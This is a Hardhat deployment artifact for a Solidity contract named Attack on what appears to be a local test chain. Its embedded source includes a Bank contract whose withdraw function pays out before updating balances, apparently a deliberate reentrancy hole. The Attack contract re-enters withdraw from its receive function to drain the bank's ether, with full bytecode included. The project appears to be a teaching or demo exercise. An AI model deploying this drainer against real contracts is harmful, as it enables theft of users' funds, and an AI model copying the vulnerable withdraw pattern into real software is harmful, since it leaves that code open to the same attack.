{
  "address": "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_bankContractAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBankAddress",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBankBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getRandom",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "transactionHash": "0x5bfab7bad33964776aaf847c573865be81d51d714104488b4cfcbb76691ef6da",
  "receipt": {
    "to": null,
    "from": "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266",
    "contractAddress": "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512",
    "transactionIndex": 0,
    "gasUsed": "367905",
    "logsBloom": "0x
    "blockHash": "0x61fe2e6027b7d12e61f14e49f1e61eee915cd1724010632a602c3b8f37440d51",
    "transactionHash": "0x5bfab7bad33964776aaf847c573865be81d51d714104488b4cfcbb76691ef6da",
    "logs": [],
    "blockNumber": 2,
    "cumulativeGasUsed": "367905",
    "status": 1,
    "byzantium": true
  },
  "args": [
    "0x5FbDB2315678afecb367f032d93F642f64180aa3"
  ],
  "numDeployments": 1,
  "solcInputHash": "a33df73ddba82ad07df2cf60fcc76508",
  "metadata": "{\"compiler\":{\"version\":\"0.8.11+commit.d7f03943\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_bankContractAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBankAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBankBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getRandom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Attack.sol\":\"Attack\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Attack.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.11;\\n\\nimport \\\"./Bank.sol\\\";\\n\\ncontract Attack {\\n    Bank private bank;\\n\\n    constructor(address _bankContractAddress) {\\n        bank = Bank(_bankContractAddress);\\n    }\\n\\n    // fallback() external payable {\\n    //     if (address(bank).balance >= 70 ether) {\\n    //         bank.withdraw(10 ether);\\n    //     }\\n    // }\\n\\n    receive() external payable {\\n        if (getBankBalance() >= uint256(70e18)) {\\n            bank.withdraw(10e18);\\n        }\\n    } \\n\\n    function attack() external payable {\\n        require(msg.value >= 1 ether, \\\"Deposit 1 or more than 1 ether\\\");\\n        bank.deposit{value: msg.value}();\\n        bank.withdraw(msg.value);\\n    }\\n\\n    function getBalance() external view returns (uint256) {\\n        return address(this).balance;\\n    }\\n\\n    function getBankAddress() external view returns (address) {\\n        return address(bank);\\n    }\\n\\n    function getBankBalance() public view returns (uint256) {\\n        return address(bank).balance;\\n    }\\n\\n    function getRandom() public view returns (uint256) {\\n        return uint256(70e18);\\n    }\\n}\\n\",\"keccak256\":\"0x1ca620a956293c8f87ef5ca221d6cc976f875e44ee74fe08c6481a3d6b791a54\",\"license\":\"MIT\"},\"contracts/Bank.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.11;\\n\\nerror Bank__TransferFail();\\n\\ncontract Bank {\\n    mapping(address => uint256) public balances;\\n\\n    event WithdrawSuccess(address indexed _withdrawer, uint256 _amount);\\n\\n    function deposit() external payable {\\n        balances[msg.sender] = msg.value;\\n    }\\n\\n    function withdraw(uint256 _amount) external {\\n        require(_amount > 0, \\\"Amount to withdraw should be greater than 0\\\");\\n        require(balances[msg.sender] >= _amount, \\\"Not enough balance\\\");\\n\\n        (bool success, ) = payable(msg.sender).call{value: _amount}(\\\"\\\");\\n\\n        if (!success) {\\n            revert Bank__TransferFail();\\n        }\\n        balances[msg.sender] -= _amount;\\n        emit WithdrawSuccess(msg.sender, _amount);\\n    }\\n\\n    function getBalance() external view returns (uint256) {\\n        return address(this).balance;\\n    }\\n}\\n\",\"keccak256\":\"0xea1291b5c076b96c7369cae5be954090ef4ba2b5cf3ca1609beefda491754fc7\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x608060405234801561001057600080fd5b50604051610650380380610650833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b610539806101176000396000f3fe60806040526004361061004e5760003560e01c806312065fe01461010557806366f780e9146101305780637b83b50b1461015b5780639e5faafc14610186578063aacc5a171461019057610100565b36610100576803cb71f51fc55800006100656101bb565b106100fe5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d678ac7230489e800006040518263ffffffff1660e01b81526004016100cb91906103e5565b600060405180830381600087803b1580156100e557600080fd5b505af11580156100f9573d6000803e3d6000fd5b505050505b005b600080fd5b34801561011157600080fd5b5061011a6101fb565b604051610127919061040f565b60405180910390f35b34801561013c57600080fd5b50610145610203565b604051610152919061046b565b60405180910390f35b34801561016757600080fd5b506101706101bb565b60405161017d919061040f565b60405180910390f35b61018e61022c565b005b34801561019c57600080fd5b506101a5610385565b6040516101b2919061040f565b60405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631905090565b600047905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b670de0b6b3a7640000341015610277576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161026e906104e3565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102df57600080fd5b505af11580156102f3573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b8152600401610351919061040f565b600060405180830381600087803b15801561036b57600080fd5b505af115801561037f573d6000803e3d6000fd5b50505050565b60006803cb71f51fc5580000905090565b6000819050919050565b6000819050919050565b6000819050919050565b60006103cf6103ca6103c584610396565b6103aa565b6103a0565b9050919050565b6103df816103b4565b82525050565b60006020820190506103fa60008301846103d6565b92915050565b610409816103a0565b82525050565b60006020820190506104246000830184610400565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006104558261042a565b9050919050565b6104658161044a565b82525050565b6000602082019050610480600083018461045c565b92915050565b600082825260208201905092915050565b7f4465706f7369742031206f72206d6f7265207468616e20312065746865720000600082015250565b60006104cd601e83610486565b91506104d882610497565b602082019050919050565b600060208201905081810360008301526104fc816104c0565b905091905056fea2646970667358221220f36f89e39d81c3f839f03191589194f8067d37d3dc1068e76ca3b29f156eb57e64736f6c634300080b0033",
  "deployedBytecode": "0x60806040526004361061004e5760003560e01c806312065fe01461010557806366f780e9146101305780637b83b50b1461015b5780639e5faafc14610186578063aacc5a171461019057610100565b36610100576803cb71f51fc55800006100656101bb565b106100fe5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d678ac7230489e800006040518263ffffffff1660e01b81526004016100cb91906103e5565b600060405180830381600087803b1580156100e557600080fd5b505af11580156100f9573d6000803e3d6000fd5b505050505b005b600080fd5b34801561011157600080fd5b5061011a6101fb565b604051610127919061040f565b60405180910390f35b34801561013c57600080fd5b50610145610203565b604051610152919061046b565b60405180910390f35b34801561016757600080fd5b506101706101bb565b60405161017d919061040f565b60405180910390f35b61018e61022c565b005b34801561019c57600080fd5b506101a5610385565b6040516101b2919061040f565b60405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631905090565b600047905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b670de0b6b3a7640000341015610277576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161026e906104e3565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102df57600080fd5b505af11580156102f3573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b8152600401610351919061040f565b600060405180830381600087803b15801561036b57600080fd5b505af115801561037f573d6000803e3d6000fd5b50505050565b60006803cb71f51fc5580000905090565b6000819050919050565b6000819050919050565b6000819050919050565b60006103cf6103ca6103c584610396565b6103aa565b6103a0565b9050919050565b6103df816103b4565b82525050565b60006020820190506103fa60008301846103d6565b92915050565b610409816103a0565b82525050565b60006020820190506104246000830184610400565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006104558261042a565b9050919050565b6104658161044a565b82525050565b6000602082019050610480600083018461045c565b92915050565b600082825260208201905092915050565b7f4465706f7369742031206f72206d6f7265207468616e20312065746865720000600082015250565b60006104cd601e83610486565b91506104d882610497565b602082019050919050565b600060208201905081810360008301526104fc816104c0565b905091905056fea2646970667358221220f36f89e39d81c3f839f03191589194f8067d37d3dc1068e76ca3b29f156eb57e64736f6c634300080b0033",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 5,
        "contract": "contracts/Attack.sol:Attack",
        "label": "bank",
        "offset": 0,
        "slot": "0",
        "type": "t_contract(Bank)205"
      }
    ],
    "types": {
      "t_contract(Bank)205": {
        "encoding": "inplace",
        "label": "contract Bank",
        "numberOfBytes": "20"
      }
    }
  }
}